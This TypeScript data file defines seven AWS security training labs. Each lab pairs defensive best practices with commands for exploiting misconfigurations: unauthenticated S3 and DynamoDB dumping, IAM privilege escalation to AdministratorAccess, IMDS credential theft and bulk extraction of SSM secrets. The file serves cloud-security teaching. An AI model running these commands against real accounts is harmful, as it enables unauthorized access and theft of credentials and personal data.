export interface Lab {
  id: string;
  title: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced";
  estimatedTime: number;
  color: string;
  shortDescription: string;
  aboutLab: string;
  yourMission: string;
  learningObjectives: string[];
  whatYouWillLearn: string[];
  syllabus: Array<{ topic: string; description: string }>;
  commonMistakes: string[];
  bestPractices: string[];
  realCommands: Array<{ description: string; command: string; expectedOutput: string }>;
}

export const educationalLabs: Lab[] = [
  {
    id: "lab-1-s3",
    title: "AWS S3 Security Lab",
    difficulty: "Beginner",
    estimatedTime: 45,
    color: "bg-blue-500",
    shortDescription: "Discover and exploit misconfigured S3 buckets to understand public access risks",
    aboutLab:
      "This lab demonstrates one of the most critical cloud misconfigurations: publicly accessible S3 buckets. You'll learn how a simple permission oversight can lead to complete data exposure. S3 is used by nearly every organization on AWS, making this vulnerability extremely impactful.",
    yourMission:
      'Your goal: Find the "my-company-secrets-2025" bucket and exfiltrate confidential financial-records.txt file without any AWS credentials to prove the vulnerability.',
    learningObjectives: [
      "Understand S3 permission models: Block Public Access, Bucket Policies, and ACLs",
      "Recognize common misconfigurations that expose sensitive data",
      "Practice unauthenticated S3 exploitation techniques",
      "Learn S3 bucket enumeration and reconnaissance",
      "Understand defense mechanisms and remediation strategies",
    ],
    whatYouWillLearn: [
      "How to check if an S3 bucket is publicly accessible",
      "Using AWS CLI with --no-sign-request flag to bypass authentication",
      "Enumeration and data exfiltration from misconfigured buckets",
      "Real-world scenario of developer mistakes",
      "How to detect and prevent S3 exposures",
      "Impact assessment of public bucket exposure",
    ],
    syllabus: [
      {
        topic: "S3 Permission Models",
        description: "Learn about Block Public Access settings, bucket policies, ACLs, and how they interact",
      },
      {
        topic: "Bucket Enumeration",
        description: "Techniques to discover public S3 buckets using naming conventions and tool scanning",
      },
      {
        topic: "Data Exfiltration",
        description: "Methods to download objects from public buckets without authentication",
      },
      {
        topic: "Remediation & Defense",
        description:
          "Implementing S3 security best practices: encryption, versioning, logging, and access controls",
      },
    ],
    commonMistakes: [
      "Setting bucket policies to allow Principal: * for s3:GetObject",
      "Disabling Block Public Access settings without understanding implications",
      "Using ACLs instead of bucket policies for access control",
      "Leaving sensitive data in buckets without encryption",
      "Not enabling S3 bucket logging for audit trails",
      "Failing to implement versioning for data recovery",
    ],
    bestPractices: [
      "Enable Block Public Access on all S3 buckets by default",
      "Use restrictive bucket policies with specific IAM principals",
      "Encrypt all sensitive data at rest using SSE-S3 or SSE-KMS",
      "Enable versioning to protect against accidental deletion",
      "Use S3 bucket logging and CloudTrail for audit trails",
      "Implement lifecycle policies to manage data retention",
      "Regular security audits using tools like AWS Access Analyzer",
      "Separate buckets for different data sensitivity levels",
    ],
    realCommands: [
      {
        description: "List contents of public S3 bucket without credentials",
        command: "aws s3 ls s3://my-company-secrets-2025 --no-sign-request",
        expectedOutput: "financial-records.txt\\nconfidential-data.xlsx",
      },
      {
        description: "Download a specific file from public bucket",
        command:
          "aws s3 cp s3://my-company-secrets-2025/financial-records.txt . --no-sign-request",
        expectedOutput: "download: ./financial-records.txt",
      },
      {
        description: "Recursively list all objects in public bucket",
        command: "aws s3 ls s3://my-company-secrets-2025 --no-sign-request --recursive",
        expectedOutput: "2025-01-15 14:32:45\\t1250  financial-records.txt",
      },
      {
        description: "Check bucket versioning status",
        command:
          "aws s3api get-bucket-versioning --bucket my-company-secrets-2025 --no-sign-request",
        expectedOutput: '{"Status": "Enabled"}',
      },
      {
        description: "Check block public access settings",
        command:
          "aws s3api get-public-access-block --bucket my-company-secrets-2025 --no-sign-request 2>&1 || echo 'Not configured'",
        expectedOutput: "NoSuchPublicAccessBlockConfiguration",
      },
    ],
  },
  {
    id: "lab-2-iam",
    title: "IAM Privilege Escalation Lab",
    difficulty: "Intermediate",
    estimatedTime: 60,
    color: "bg-orange-500",
    shortDescription: "Learn IAM exploitation and privilege escalation techniques in AWS",
    aboutLab:
      "This lab explores one of the most dangerous AWS vulnerabilities: IAM privilege escalation. Attackers with limited credentials can escalate privileges to gain admin access. Understanding these vectors is crucial for defenders.",
    yourMission:
      "You have credentials for a limited IAM user. Discover and exploit over-permissive policies to escalate to admin privileges and access restricted resources.",
    learningObjectives: [
      "Understand IAM privilege escalation vectors and attack paths",
      "Recognize over-permissive IAM policies and inline policies",
      "Learn policy evaluation logic and the principle of least privilege",
      "Practice identifying and exploiting iam:AttachUserPolicy, iam:PutUserPolicy",
      "Understand the impact of wildcard permissions (*)",
      "Learn defense mechanisms and policy analysis",
    ],
    whatYouWillLearn: [
      "How to enumerate IAM users, roles, and policies",
      "Identifying which permissions your user has",
      "Exploiting iam:* permissions for privilege escalation",
      "Understanding inline vs managed policies",
      "How to assume roles for further access",
      "Defensive IAM policy design patterns",
    ],
    syllabus: [
      {
        topic: "IAM Basics",
        description: "Users, roles, policies, resources, and policy evaluation logic",
      },
      {
        topic: "Privilege Escalation Vectors",
        description: "Seven main paths to privilege escalation in AWS IAM",
      },
      {
        topic: "Policy Exploitation",
        description: "How to leverage over-permissive policies for unauthorized access",
      },
      {
        topic: "Detection & Prevention",
        description:
          "Using IAM Access Analyzer, CloudTrail, and policy validation tools",
      },
    ],
    commonMistakes: [
      "Granting iam:* on all resources for troubleshooting",
      "Using managed policies like AdministratorAccess too broadly",
      "Creating inline policies without review",
      "Not restricting iam:PassRole permissions",
      "Leaving wildcard resources (*) in policies",
      "Not rotating access keys regularly",
    ],
    bestPractices: [
      "Apply principle of least privilege - grant only necessary permissions",
      "Use resource-based policies to further restrict access",
      "Implement permission boundaries to limit maximum permissions",
      "Regularly audit policies with IAM Access Analyzer",
      "Use service control policies (SCPs) for account-wide restrictions",
      "Enable MFA for sensitive operations",
      "Implement automated policy compliance checking",
      "Use roles instead of users for long-term credentials",
    ],
    realCommands: [
      {
        description: "Verify current IAM user identity",
        command: "aws sts get-caller-identity",
        expectedOutput: 'Account": "123456789012", "Arn": "arn:aws:iam::123456789012:user/attacker-user"',
      },
      {
        description: "List all IAM users in account",
        command: "aws iam list-users",
        expectedOutput:
          'UserName": "vulnerable-user", "Arn": "arn:aws:iam::123456789012:user/vulnerable-user"',
      },
      {
        description: "Get inline policies for current user",
        command: "aws iam list-user-policies --user-name attacker-user",
        expectedOutput: '"inline-escalation-policy"',
      },
      {
        description: "Attach admin policy to escalate privileges",
        command:
          "aws iam attach-user-policy --user-name attacker-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        expectedOutput: "(Success - no output)",
      },
      {
        description: "Verify escalated access with admin operation",
        command: "aws iam list-all-my-buckets 2>&1 || aws s3 ls",
        expectedOutput: "Bucket1\\nBucket2\\nBucket3",
      },
    ],
  },
  {
    id: "lab-3-ec2",
    title: "EC2 Security Group Bypass Lab",
    difficulty: "Intermediate",
    estimatedTime: 50,
    color: "bg-amber-500",
    shortDescription: "Exploit misconfigurations in EC2 security groups and gain SSH access",
    aboutLab:
      "Security groups are the firewall for EC2 instances. This lab demonstrates how misconfigurations allow unauthorized access to instances, leading to full system compromise.",
    yourMission:
      "Discover EC2 instances with overly permissive security groups. Gain SSH access and retrieve the flag from the compromised server.",
    learningObjectives: [
      "Understand security group rules and how they control traffic",
      "Recognize over-permissive ingress rules (0.0.0.0/0, ::/0)",
      "Learn EC2 enumeration techniques",
      "Practice SSH exploitation and lateral movement",
      "Understand the IMDS (Instance Metadata Service) for credential theft",
      "Learn defense mechanisms and security group best practices",
    ],
    whatYouWillLearn: [
      "How to enumerate EC2 instances and their security groups",
      "Identifying instances exposed to the internet",
      "SSH key compromise and management",
      "Accessing instance metadata to steal IAM credentials",
      "Lateral movement within the VPC",
      "Post-exploitation techniques on compromised instances",
    ],
    syllabus: [
      {
        topic: "Security Group Basics",
        description: "Inbound and outbound rules, CIDR blocks, and protocol restrictions",
      },
      {
        topic: "EC2 Enumeration",
        description: "Discovering EC2 instances, their configuration, and exposed services",
      },
      {
        topic: "SSH Exploitation",
        description: "Weak credentials, key management, and authorized_keys abuse",
      },
      {
        topic: "IMDS & Credential Theft",
        description: "Using instance metadata service to compromise EC2 instance roles",
      },
    ],
    commonMistakes: [
      "Allowing SSH (port 22) from 0.0.0.0/0 in security groups",
      "Using weak or default SSH key passphrases",
      "Not restricting IMDS access with IMDSv2",
      "Storing SSH keys in git repositories",
      "Not rotating SSH keys regularly",
      "Leaving RDP (port 3389) open to the internet on Windows instances",
    ],
    bestPractices: [
      "Restrict security group rules to specific IPs or security groups",
      "Use a bastion host for SSH access instead of direct internet exposure",
      "Enforce IMDSv2 and disable IMDSv1",
      "Rotate SSH keys regularly and use key management services",
      "Use Systems Manager Session Manager instead of direct SSH",
      "Monitor security group changes with CloudTrail",
      "Implement network segmentation with multiple security groups",
      "Use automated compliance scanning tools",
    ],
    realCommands: [
      {
        description: "List EC2 instances with public IPs",
        command: "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,SecurityGroups]'",
        expectedOutput: 'i-0123456789abcdef", "54.210.132.101", ["web-sg"]',
      },
      {
        description: "Get security group details",
        command:
          "aws ec2 describe-security-groups --group-ids sg-12345678 --query 'SecurityGroups[*].IpPermissions'",
        expectedOutput: 'FromPort": 22, "ToPort": 22, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]',
      },
      {
        description: "SSH into exposed instance",
        command: "ssh -i lab-key-pair.pem ec2-user@54.210.132.101",
        expectedOutput: "ec2-user@ip-10-0-0-50:~$",
      },
      {
        description: "Access instance metadata service v2",
        command:
          'curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" && curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        expectedOutput: "ec2-instance-role",
      },
      {
        description: "Retrieve temporary credentials from IMDS",
        command:
          'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role | jq .',
        expectedOutput:
          '"AccessKeyId": "ASIAVQX...", "SecretAccessKey": "i2...", "Token": "Fsw..."',
      },
    ],
  },
  {
    id: "lab-4-lambda",
    title: "Lambda Data Exposure Lab",
    difficulty: "Advanced",
    estimatedTime: 55,
    color: "bg-yellow-500",
    shortDescription: "Extract sensitive data from over-permissive Lambda functions",
    aboutLab:
      "Lambda functions often have over-permissive execution roles. This lab shows how to invoke Lambda functions and extract sensitive data including database credentials and configuration secrets.",
    yourMission:
      "Discover a Lambda function with excessive permissions. Invoke it to extract database credentials and API keys stored in environment variables and returned by the function.",
    learningObjectives: [
      "Understand Lambda function permissions and execution roles",
      "Learn how to enumerate Lambda functions in an AWS account",
      "Practice Lambda function invocation and exploitation",
      "Understand environment variable exposure risks",
      "Learn about inline code and layer inspection",
      "Understand the principle of least privilege for Lambda",
    ],
    whatYouWillLearn: [
      "Lambda reconnaissance and enumeration techniques",
      "How to invoke functions and interpret responses",
      "Environment variable extraction and exploitation",
      "Layer analysis for hardcoded secrets",
      "Dead code analysis and information disclosure",
      "Lambda security hardening practices",
    ],
    syllabus: [
      {
        topic: "Lambda Fundamentals",
        description: "Functions, execution roles, environment variables, and layers",
      },
      {
        topic: "Permission Analysis",
        description: "Lambda permissions and over-permissive execution roles",
      },
      {
        topic: "Function Invocation",
        description: "Synchronous and asynchronous invocation with payload manipulation",
      },
      {
        topic: "Data Extraction",
        description: "Secrets in responses, environment variables, and source code exposure",
      },
    ],
    commonMistakes: [
      "Attaching over-permissive policies like AmazonDynamoDBFullAccess to Lambda roles",
      "Storing secrets in environment variables without encryption",
      "Returning sensitive data in function responses",
      "Not using Lambda function URLs properly secured",
      "Hardcoding credentials in function code or layers",
      "Not limiting function concurrency and execution time",
    ],
    bestPractices: [
      "Use AWS Secrets Manager or SSM Parameter Store for sensitive data",
      "Encrypt environment variables with KMS",
      "Apply least privilege to Lambda execution roles",
      "Use VPC endpoints for AWS service access",
      "Implement input validation and sanitization",
      "Monitor Lambda function invocations with CloudTrail",
      "Use reserved concurrency to prevent abuse",
      "Regular code review and static analysis",
    ],
    realCommands: [
      {
        description: "List all Lambda functions in region",
        command: "aws lambda list-functions --region us-east-1",
        expectedOutput: '"FunctionName": "DataProcessorFunction", "Role": "arn:aws:iam::123456789012:role/LambdaProcessorRole"',
      },
      {
        description: "Get Lambda function configuration",
        command: "aws lambda get-function --function-name DataProcessorFunction",
        expectedOutput: '"Environment": {"Variables": {"DB_HOST": "internal-db.example.com"}}, "Role": "arn:aws:iam::...:role/LambdaProcessorRole"',
      },
      {
        description: "Invoke Lambda function to trigger data leak",
        command: 'aws lambda invoke --function-name DataProcessorFunction response.json',
        expectedOutput: '"StatusCode": 200',
      },
      {
        description: "View Lambda function response with leaked secrets",
        command: "cat response.json | jq .",
        expectedOutput:
          '{"statusCode": 200, "body": "DB Connection: host=internal-db.example.com;password=TopSecretPassword123!"}',
      },
      {
        description: "Check Lambda execution role policies",
        command: "aws iam list-attached-role-policies --role-name LambdaProcessorRole",
        expectedOutput: '"PolicyName": "AmazonDynamoDBFullAccess"',
      },
    ],
  },
  {
    id: "lab-5-dynamodb",
    title: "DynamoDB Data Exposure Lab",
    difficulty: "Beginner",
    estimatedTime: 40,
    color: "bg-emerald-500",
    shortDescription: "Scan and extract data from publicly exposed DynamoDB tables",
    aboutLab:
      "DynamoDB tables can be accidentally exposed to public access through resource-based policies. This lab demonstrates how unauthenticated users can scan and exfiltrate entire databases.",
    yourMission:
      "Find the publicly accessible CustomerTransactions DynamoDB table. Scan it without any credentials to extract customer payment information and PII.",
    learningObjectives: [
      "Understand DynamoDB access control and resource-based policies",
      "Learn how to enumerate and scan DynamoDB tables",
      "Practice unauthenticated data exfiltration",
      "Understand DynamoDB query and scan operations",
      "Learn encryption and access control mechanisms",
      "Understand automated vulnerability scanning tools",
    ],
    whatYouWillLearn: [
      "DynamoDB reconnaissance and table discovery",
      "Scanning tables with and without authentication",
      "Query operations for targeted data extraction",
      "Using automated tools: nuclei, Pacu, Prowler, Cloudsplaining",
      "Data leak impact assessment",
      "DynamoDB security hardening",
    ],
    syllabus: [
      {
        topic: "DynamoDB Basics",
        description: "Tables, items, attributes, and query vs scan operations",
      },
      {
        topic: "Access Control",
        description: "Resource-based policies, identity-based policies, and public access",
      },
      {
        topic: "Exploitation Techniques",
        description: "Unauthenticated and authenticated scanning and data extraction",
      },
      {
        topic: "Automated Scanning",
        description: "Using security tools to find and exploit public DynamoDB tables",
      },
    ],
    commonMistakes: [
      "Setting resource-based policies with Principal: * allowing public access",
      "Not enabling encryption at rest",
      "Storing sensitive PII without pseudonymization",
      "Not implementing point-in-time recovery",
      "Excessive read/write capacity for public endpoints",
      "Missing CloudTrail logging for API calls",
    ],
    bestPractices: [
      "Never allow public access to DynamoDB tables",
      "Use identity-based policies instead of resource-based policies",
      "Enable encryption at rest with AWS KMS",
      "Use VPC endpoints for VPC-internal access only",
      "Implement fine-grained access control with DAX",
      "Enable CloudTrail logging for all DynamoDB API calls",
      "Use point-in-time recovery for data protection",
      "Regular compliance scanning with automated tools",
    ],
    realCommands: [
      {
        description: "Scan entire DynamoDB table without credentials",
        command:
          "aws dynamodb scan --table-name CustomerTransactions --no-sign-request --region us-east-1",
        expectedOutput:
          '"Items": [{"CustomerId": {"S": "cust-12345"}, "CreditCardNumber": {"S": "4111111111111111"}, "TransactionAmount": {"N": "150.75"}}]',
      },
      {
        description: "Get item from table by key",
        command:
          'aws dynamodb get-item --table-name CustomerTransactions --key "{\\\"CustomerId\\\": {\\\"S\\\": \\\"cust-12345\\\"}}" --no-sign-request',
        expectedOutput: '"Item": {"CustomerId": {"S": "cust-12345"}, "Email": {"S": "customer@example.com"}, "Address": {"S": "123 Main St"}}',
      },
      {
        description: "Describe table to understand structure",
        command: "aws dynamodb describe-table --table-name CustomerTransactions --no-sign-request",
        expectedOutput:
          '"TableName": "CustomerTransactions", "KeySchema": [{"AttributeName": "CustomerId", "KeyType": "HASH"}]',
      },
      {
        description: "Query for specific customer records",
        command:
          'aws dynamodb query --table-name CustomerTransactions --key-condition-expression "CustomerId = :cid" --expression-attribute-values "{\\\":cid\\\": {\\\"S\\\": \\\"cust-12345\\\"}}" --no-sign-request',
        expectedOutput:
          '"Count": 5, "Items": [{"CustomerId": {"S": "cust-12345"}, "SSN": {"S": "123-45-6789"}}]',
      },
      {
        description: "Check table encryption status",
        command:
          "aws dynamodb describe-table --table-name CustomerTransactions --query 'Table.SSEDescription' --no-sign-request 2>&1 || echo 'No encryption'",
        expectedOutput: "null or encryption details",
      },
    ],
  },
  {
    id: "lab-6-cloudtrail",
    title: "CloudTrail Investigation Lab",
    difficulty: "Intermediate",
    estimatedTime: 60,
    color: "bg-cyan-500",
    shortDescription: "Extract sensitive audit logs from publicly exposed CloudTrail S3 buckets",
    aboutLab:
      "CloudTrail logs are goldmines for attackers. This lab demonstrates how publicly accessible CloudTrail buckets leak detailed information about account activities, IAM users, API calls, and internal infrastructure.",
    yourMission:
      "Find the publicly accessible CloudTrail bucket. Download and analyze logs to extract sensitive information: IAM usernames, API calls, internal IP ranges, and privilege escalation paths.",
    learningObjectives: [
      "Understand CloudTrail logging and audit trails",
      "Learn CloudTrail log structure and format",
      "Practice analyzing CloudTrail logs for security insights",
      "Extract sensitive information from audit logs",
      "Understand privilege escalation from logs",
      "Learn CloudTrail best practices and access control",
    ],
    whatYouWillLearn: [
      "CloudTrail bucket discovery and access patterns",
      "Log file structure and navigation",
      "Extracting API calls, users, and resource changes",
      "Identifying privilege escalation events",
      "Discovering internal infrastructure and topology",
      "Using jq for log analysis and parsing",
    ],
    syllabus: [
      {
        topic: "CloudTrail Fundamentals",
        description: "Log format, events, and organization in S3 buckets",
      },
      {
        topic: "Log Analysis",
        description: "Parsing JSON logs, extracting events, and identifying patterns",
      },
      {
        topic: "Information Extraction",
        description: "API calls, users, roles, timestamps, and resource changes",
      },
      {
        topic: "Exploitation Path",
        description: "Using log information to plan privilege escalation and attacks",
      },
    ],
    commonMistakes: [
      "Not enabling CloudTrail logging in all regions",
      "Making CloudTrail S3 buckets public with Principal: *",
      "Not enabling MFA Delete on CloudTrail bucket",
      "Not validating log file integrity",
      "Storing CloudTrail logs without encryption",
      "Not using separate CloudTrail bucket with restricted access",
    ],
    bestPractices: [
      "Enable organization-wide CloudTrail in all regions",
      "Use separate, restricted S3 bucket for CloudTrail logs",
      "Enable MFA Delete protection on CloudTrail bucket",
      "Validate log file integrity using CloudTrail log file validation",
      "Enable encryption using AWS KMS for logs",
      "Implement S3 lifecycle policies for log retention",
      "Monitor CloudTrail bucket access with CloudTrail itself",
      "Use EventBridge for real-time alerting on suspicious events",
    ],
    realCommands: [
      {
        description: "List CloudTrail S3 bucket contents",
        command:
          "aws s3 ls s3://aws-cloudtrail-logs-590183751680/ --no-sign-request --recursive",
        expectedOutput:
          "AWSLogs/590183751680/CloudTrail/us-east-1/2025/08/30/12_30_00_12345.json.gz",
      },
      {
        description: "List logs for specific date",
        command:
          "aws s3 ls s3://aws-cloudtrail-logs-590183751680/AWSLogs/590183751680/CloudTrail/us-east-1/2025/08/30/ --no-sign-request",
        expectedOutput: "2025-08-30 12:30:45      4567  12_30_00_12345.json.gz",
      },
      {
        description: "Download CloudTrail log file",
        command:
          "aws s3 cp s3://aws-cloudtrail-logs-590183751680/AWSLogs/590183751680/CloudTrail/us-east-1/2025/08/30/12_30_00_12345.json.gz . --no-sign-request",
        expectedOutput: "download: s3://.../12_30_00_12345.json.gz to ./12_30_00_12345.json.gz",
      },
      {
        description: "Decompress and parse CloudTrail logs",
        command:
          "gunzip 12_30_00_12345.json.gz && cat 12_30_00_12345.json | jq '.Records[] | {eventName, userIdentity: .userIdentity.arn, sourceIP: .sourceIPAddress, timestamp: .eventTime}'",
        expectedOutput:
          '{"eventName": "AssumeRole", "userIdentity": "arn:aws:iam::590183751680:user/admin", "sourceIP": "203.45.67.89", "timestamp": "2025-08-30T12:30:45Z"}',
      },
      {
        description: "Search for privilege escalation events",
        command:
          "cat 12_30_00_12345.json | jq '.Records[] | select(.eventName == \"AttachUserPolicy\" or .eventName == \"PutUserPolicy\") | {eventName, user: .userIdentity.principalId, targetUser: .requestParameters.userName}'",
        expectedOutput:
          '{"eventName": "AttachUserPolicy", "user": "AIDASOMETHING", "targetUser": "attacker-user"}',
      },
    ],
  },
  {
    id: "lab-7-ssm",
    title: "SSM Parameter Store Secrets Lab",
    difficulty: "Intermediate",
    estimatedTime: 55,
    color: "bg-violet-500",
    shortDescription: "Extract plaintext secrets stored in AWS Systems Manager Parameter Store",
    aboutLab:
      "Many developers store secrets in SSM Parameter Store as String type instead of SecureString. This lab demonstrates how over-permissive ssm:GetParameter permissions allow extraction of all stored secrets including database passwords and API keys.",
    yourMission:
      "Using limited app-deployer credentials, enumerate and extract all secrets stored in Parameter Store. Retrieve database passwords, API keys, and configuration data.",
    learningObjectives: [
      "Understand SSM Parameter Store and secure parameter types",
      "Learn parameter naming conventions and discovery",
      "Practice parameter extraction techniques",
      "Understand the difference between String and SecureString types",
      "Learn about over-permissive ssm:* permissions",
      "Understand secrets management best practices",
    ],
    whatYouWillLearn: [
      "Parameter Store enumeration and discovery",
      "Parameter extraction with and without encryption",
      "Automation script for mass extraction",
      "KMS key exploitation for SecureString parameters",
      "Access control and least privilege for secrets",
      "Migration from Parameter Store to Secrets Manager",
    ],
    syllabus: [
      {
        topic: "Parameter Store Basics",
        description: "Parameter types, naming conventions, and the secure vs insecure storage",
      },
      {
        topic: "Parameter Discovery",
        description: "Enumerating parameters and understanding naming patterns",
      },
      {
        topic: "Secret Extraction",
        description: "Retrieving String and SecureString parameters programmatically",
      },
      {
        topic: "Remediation",
        description:
          "Migrating to Secrets Manager, encryption, and access control implementation",
      },
    ],
    commonMistakes: [
      "Storing secrets as String type instead of SecureString",
      "Granting ssm:GetParameter on all resources (*)",
      "Using AmazonSSMReadOnlyAccess managed policy too broadly",
      "Not restricting KMS key access for decryption",
      "Storing secrets in configuration files",
      "Not rotating secrets regularly",
    ],
    bestPractices: [
      "Always use SecureString type for sensitive parameters",
      "Use AWS Secrets Manager for sensitive data instead of Parameter Store",
      "Restrict ssm:GetParameter to specific parameter paths",
      "Use KMS keys with restrictive policies for encryption",
      "Implement secret rotation policies",
      "Audit access with CloudTrail and Parameter Store audit logging",
      "Use VPC endpoints for private Parameter Store access",
      "Implement least privilege for all parameter permissions",
    ],
    realCommands: [
      {
        description: "Verify current IAM user credentials",
        command: "aws sts get-caller-identity",
        expectedOutput: '"Arn": "arn:aws:iam::123456789012:user/app-deployer"',
      },
      {
        description: "List all parameters in account",
        command: "aws ssm describe-parameters",
        expectedOutput:
          '"Parameters": [{"Name": "/app/database/password", "Type": "String"}, {"Name": "/prod/api/key", "Type": "String"}]',
      },
      {
        description: "Retrieve database password parameter",
        command: 'aws ssm get-parameter --name "/app/database/password"',
        expectedOutput:
          '{"Parameter": {"Name": "/app/database/password", "Type": "String", "Value": "SuperSecretDBPassword123!"}}',
      },
      {
        description: "Retrieve API key parameter",
        command: 'aws ssm get-parameter --name "/prod/api/key"',
        expectedOutput:
          '{"Parameter": {"Name": "/prod/api/key", "Type": "String", "Value": "AKIATOPSEKRITAPIKEY12345"}}',
      },
      {
        description: "Automate extraction of all parameters",
        command:
          'aws ssm describe-parameters --query "Parameters[*].Name" --output text | tr "\\t" "\\n" | while read -r name; do echo "Parameter: $name"; aws ssm get-parameter --name "$name" --query "Parameter.Value" --output text; echo "---"; done',
        expectedOutput:
          'Parameter: /app/database/password\\nSuperSecretDBPassword123!\\nParameter: /prod/api/key\\nAKIATOPSEKRITAPIKEY12345',
      },
    ],
  },
];